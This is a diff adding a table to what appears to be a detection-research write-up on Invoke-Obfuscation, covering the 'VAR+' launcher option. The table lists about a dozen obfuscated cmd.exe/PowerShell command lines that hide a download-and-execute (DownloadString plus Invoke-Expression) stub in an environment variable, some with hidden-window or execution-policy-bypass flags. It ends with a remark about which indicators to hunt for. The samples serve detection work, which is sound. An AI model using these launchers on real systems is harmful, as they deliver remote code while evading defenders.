@@ -505,7 +505,37 @@ you can copy the results from all cases for one or more obfuscation methods and 
 
 ### VAR+ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
-
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">20</td>
+  <td align="center">LAUNCHER\VAR+\*</td>
+  <td>
+   <strong>LAUNCHER\VAR+\0       NO EXECUTION FLAGS</strong>
+   <p>cMD.exe /C   "seT   SlDb=Invoke-Expression (New-Object Net.WebClient).DownloadString&&  pOWErShell   .((   ^&(\"{1}{0}{2}{3}\" -f 'eT-vaR','G','iab','lE'  ) (\"{0}{1}\" -f '*m','DR*' ) ).\"na`ME\"[3,11,2]-JOIN'' ) ( ( ^&(\"{0}{1}\" -f'g','CI' ) (\"{0}{1}\" -f 'ENV',':SlDb'  ) ).\"VA`luE\"  ) "</p>
+   <p>c:\winDoWs\SYsTEM32\CMD.eXe  /c "seT   ngYC=Invoke-Expression (New-Object Net.WebClient).DownloadString&&PowERShELL   Set-vARIaBlE  ( \"C\"  + \"lI10\"  )  (  [TYPE](\"{1}{2}{0}\"-F 'nT','ENVIr','ONme' )   )  ;   ${eXecUTIOncOnTeXT}.\"inv`OkEcomm`AnD\".\"InV`o`KEsCRIPT\"(  (    $cli10::( \"{4}{2}{1}{3}{0}{5}{6}\"-f 'IA','roNmeNTV','VI','aR','GetEN','b','le').Invoke( (\"{0}{1}\" -f'ngY','c'),( \"{0}{1}\" -f 'pROCes','s'  )  ) )    )"</p>
+   <p>CMd.eXe /c"seT  iKrV=Invoke-Expression (New-Object Net.WebClient).DownloadString&&   POWErSHELL   ${eXe`CUtI`ONcOn`Text}.\"in`VOKe`cOMm`AND\".(\"{0}{3}{1}{2}\" -f 'IN','ESC','RipT','voK' ).Invoke(    (  .(  \"{2}{1}{0}\"-f'DiTeM','IL','cH'  ) (  \"{1}{0}\" -f':ikrV','Env') ).\"Va`lUe\" )"</p>
+   <p>c:\wINDOwS\SyStEm32\CMd.Exe  /C "seT   jpd=Invoke-Expression (New-Object Net.WebClient).DownloadString&&   pOWerShElL    $Vk23n6 =  [TYPE](\"{2}{0}{1}\"-F 'vI','ronmenT','EN' )  ;   ^&  (  ${s`heL`LID}[1]  +${SHE`ll`iD}[13] + 'x'  ) ( (  (   gET-VARiAbLE (\"vk23\"+  \"N6\") ).valUE::( \"{2}{3}{4}{0}{1}\"-f 'vARIAb','Le','getEn','VIRonMe','Nt' ).Invoke( 'JPD',(  \"{1}{0}\" -f'eSs','PRoc' )  ))  )"</p>
+   -------------------------------------------------------------------------------------------------------<br>
+   <p><strong>Options LAUNCHER\VAR+\1 - LAUNCHER\VAR+\8 of this launcher just apply different <br>PS keys same as <a href="https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation"> LAUNCHER\PS\* (case 10)</a>, so in this case we should <br>only hunt for VAR+ indicators:</strong></p>
+   -------------------------------------------------------------------------------------------------------<br>
+   <p>c:\wiNdOWS\sYSteM32\CMD.exE   /C"Set  oAMBj=Invoke-Expression (New-Object Net.WebClient).DownloadString&& poWERshElL  -NoExI    sEt-Item  (\"Var\" + \"IAblE:v\"  + \"Yd5Z2\"  ) (  [tYpE]( \"{2}{0}{1}{3}\"-f'ROnM','E','ENvi','nt' )  )   ;  ${exEcuTIONCoNtEXT}.\"InVo`ke`COMmAND\".\"In`Vok`escripT\"(   ( (   GCi  ( \"VAR\" +  \"iABlE:v\"  +\"yd5z2\")    ).valUE::(\"{3}{2}{5}{1}{4}{0}\"-f 'lE','Ria','EnviROnMeN','GET','b','tVa' ).Invoke((\"{0}{1}\" -f'o','AmBj'  ),(  \"{1}{2}{0}\" -f 's','Pr','Oces')  ))   )"</p>
+   <p>CMD.ExE/C"sEt  iXH=Invoke-Expression (New-Object Net.WebClient).DownloadString&&   poWersHELl -nonINTera   ${x`ht8}   =  [TyPE](  \"{1}{0}{2}\"-F 'oN','enviR','ment' )   ;    ( ${Xh`T8}::(\"{3}{4}{6}{2}{0}{5}{1}\" -f'aB','e','i','GETEN','viRon','l','MenTVAR').Invoke( 'ixH',(  \"{0}{2}{1}\"-f 'P','S','ROCES'  ))  )^| . (  \"{1}{0}\"-f 'X','iE'  )"</p>
+   <p>C:\winDoWs\SySTeM32\cmd.Exe  /C"SET  NOtI=Invoke-Expression (New-Object Net.WebClient).DownloadString&&  PowERshElL  -NOl    SET-iteM (  'VAR' +  'i'+ 'A'  + 'blE:Ao6' +  'I0') (  [TYpe](\"{2}{3}{0}{1}\"-F 'iRoN','mENT','e','nv')  )    ;   ${exECUtIONCOnTEXT}.\"IN`VO`KecOmMaND\".\"inVo`KES`crIPt\"(    ( ( GEt-VAriAble  (  'a'  +  'o6I0')  -vaLU  )::(\"{1}{4}{2}{3}{0}\" -f'e','gETenvIR','NtvaRIa','BL','ONme'  ).Invoke((  \"{0}{1}\"-f'n','oti'  ),( \"{0}{1}\" -f'pRoC','esS') ))  )"</p>
+   <p>C:\WIndoWs\systeM32\cMD   /c   "sET  qTHsa=Invoke-Expression (New-Object Net.WebClient).DownloadString&&  POWerSHell -NOPRofI     ${m`FLj`92}   =  [TYPE](\"{1}{2}{0}\" -F 'eNT','enViRo','NM' )   ;   (  ${mF`LJ`92}::(\"{4}{2}{3}{0}{1}\" -f 'L','e','RoNMe','nTVariab','gEtEnVi'  ).Invoke(  ( \"{0}{1}\" -f 'qTHS','A'  ),(\"{0}{1}\"-f'pR','oCEsS') ))  ^|    ^&  (\"{3}{0}{1}{2}\" -f'Ke-','eXP','rEsSiOn','invO')"</p>
+   <p>c:\wiNDOws\systeM32\CmD.exe   /C "SEt  Tzd=Invoke-Expression (New-Object Net.WebClient).DownloadString&&   pOWeRShEll -cOMMa    $RiJGl  = [TyPe](  \"{0}{2}{1}\" -f 'ENViROn','t','Men' )   ;  ${ExeCutIONConTeXT}.\"iNVo`kecO`MManD\".(  \"{0}{2}{1}{3}\" -f 'INv','KEscri','o','Pt'  ).Invoke(  (  $rijGl::( \"{1}{4}{3}{0}{2}\" -f'tVarIAB','ge','Le','meN','tenvIrOn' ).Invoke( 'TzD',(  \"{2}{0}{1}\"-f 'cEs','s','PRO' )))  )"</p>
+   <p>C:\wInDOWS\sYsTEm32\cMD.EXe  /C "seT  XyP=Invoke-Expression (New-Object Net.WebClient).DownloadString&&   pOWeRSHeLl  -win  hIDD  ( .(  \"{0}{2}{1}\"-f 'v','E','aRiABL'  ) (  \"{0}{1}\"-f 'e','x*xT' ) -VaLU).\"inV`OKE`CoMMa`Nd\".( \"{1}{0}{2}\" -f 'OKES','INV','CRIpt').Invoke( ( ^&  ( 'lS') (  \"{1}{0}\"-f'xyp','EnV:')).\"Va`luE\" )"</p>
+   <p>C:\wINdOWs\SyStem32\cMD   /C "SeT  NLrHS=Invoke-Expression (New-Object Net.WebClient).DownloadString&&   poWeRShELL -EXECuTIOnpoLIcY  bypasS    (.(\"{0}{1}\"-f 'vARi','Able' ) (  \"{0}{1}\"-f'e','X*XT') -VALuEoNly ).\"inV`OKE`COMma`ND\".(\"{1}{0}{2}\" -f'ip','InVokeScR','T'  ).Invoke(   (   ^&  (  \"{2}{3}{0}{1}{4}\"-f'Di','t','GE','T-CHIL','EM' ) ( \"{3}{1}{2}{0}\"-f 'Rhs','nv',':nl','E') ).\"VaL`UE\"  )"</p>
+   <p>cMd.eXE  /C   "Set   prJ=Invoke-Expression (New-Object Net.WebClient).DownloadString&&  C:\WIndows\SYSWOW64\wINdowspoWeRShelL\V1.0\PoWErSHELL.EXE  ^&(\"{1}{0}\" -f 'x','ie'  ) ( (.( \"{0}{1}\" -f 'D','ir'  ) ( \"{2}{0}{1}\"-f 'pr','J','ENV:')).\"v`ALuE\"   ) "</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
 
 ### STDIN+ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
